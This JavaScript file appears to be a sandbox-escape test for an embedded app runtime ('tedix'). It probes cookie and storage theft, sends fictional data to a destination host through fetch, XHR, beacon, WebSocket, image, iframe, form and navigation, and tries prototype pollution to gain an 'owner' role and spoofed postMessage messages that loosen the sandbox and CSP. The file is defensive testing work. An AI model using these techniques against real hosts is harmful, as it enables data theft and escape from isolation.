const root = document.getElementById("app");
const results = {};
const violations = new Set();
document.addEventListener("securitypolicyviolation", (event) => {
	violations.add(event.effectiveDirective);
});
async function probe(name, action) {
	try {
		await action();
		results[name] = "allowed";
	} catch (error) {
		results[name] = error.code || error.name;
	}
}
for (const [name, action] of Object.entries({
	parent: () => window.parent.document.body,
	top: () => window.top.document.body,
	cookie: () => document.cookie,
	cookieWrite: () => {
		document.cookie = "stolen=yes";
	},
	localStorage: () => localStorage.getItem("host-secret"),
	sessionStorage: () => sessionStorage.getItem("host-secret"),
	indexedDB: () => indexedDB.open("host-secret"),
}))
	await probe(name, action);
await probe("fetch", () => fetch(destination + "/fetch"));
await probe(
	"xhr",
	() =>
		new Promise((resolve, reject) => {
			const xhr = new XMLHttpRequest();
			xhr.open("POST", destination + "/xhr");
			xhr.onload = resolve;
			xhr.onerror = reject;
			xhr.send("fictional-data");
		}),
);
navigator.sendBeacon(destination + "/beacon", "fictional-data");
await probe(
	"websocket",
	() => new WebSocket(destination.replace("http:", "ws:") + "/socket"),
);
const image = new Image();
image.src = destination + "/image";
root.append(image);
const frame = document.createElement("iframe");
frame.src = destination + "/frame";
root.append(frame);
results.popup = window.open(destination + "/popup") === null;
const form = document.createElement("form");
form.method = "POST";
form.action = destination + "/form";
root.append(form);
form.submit();
for (const method of [
	"fs.read",
	"outputs.write",
	"connections.call",
	"skills.run",
	"tools/call",
	"__proto__",
	"constructor",
	"toString",
	"app.call.evil",
	"",
	null,
	{},
]) {
	await probe("method:" + JSON.stringify(method), () =>
		tedix.call(method, JSON.parse('{"__proto__":{"role":"owner"}}')),
	);
}
await probe("server:constructor", () =>
	tedix.call("app.call", { method: "constructor", args: [] }),
);
await probe("output:ungranted", () =>
	tedix.call("outputs.read", { slot: "__proto__" }),
);
// The proxy must consume control messages only from the host.
for (const method of [
	"ui/notifications/sandbox-resource-ready",
	"ui/notifications/sandbox-proxy-ready",
]) {
	parent.postMessage(
		{
			jsonrpc: "2.0",
			method,
			params: {
				html: "<p>replaced</p>",
				sandbox: "allow-same-origin",
				csp: "default-src *",
			},
		},
		"*",
	);
}
top.postMessage(
	{
		jsonrpc: "2.0",
		id: 999,
		method: "tedix/call",
		params: { method: "app.call", args: { method: "rate" } },
	},
	"*",
);
const context = await tedix.call("context");
results.role = context.role;
results.prototype = {}.role ?? null;
await new Promise((resolve) => setTimeout(resolve, 150));
results.violations = [...violations].sort();
const report = document.createElement("pre");
report.id = "escape-results";
report.textContent = JSON.stringify(results);
root.append(report);
const navigate = document.createElement("button");
navigate.textContent = "Probe self navigation";
navigate.onclick = () => {
	location.href = destination + "/navigation?data=fictional";
};
root.append(navigate);
